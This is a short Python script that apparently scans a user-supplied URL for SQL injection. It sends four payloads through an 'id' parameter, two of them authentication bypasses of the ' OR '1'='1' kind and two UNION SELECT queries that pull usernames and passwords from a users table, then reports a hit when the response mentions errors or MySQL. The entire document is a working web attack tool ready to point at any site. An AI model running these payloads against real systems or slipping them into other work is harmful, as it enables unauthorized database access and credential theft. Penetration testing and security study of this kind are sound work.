import requests

def sqli_scan(url):
    payloads = [
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' UNION SELECT NULL, username, password FROM users --",
        "' AND 1=2 UNION SELECT username, password FROM users --"
    ]
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if "error" in response.text or "mysql" in response.text:
            print(f"[+] Potential SQL Injection vulnerability found at: {test_url}")
        else:
            print(f"[-] No SQLi found with payload: {payload}")
        
def main():
    target_url = input("Enter target URL: ")
    sqli_scan(target_url)

if __name__ == "__main__":
    main()
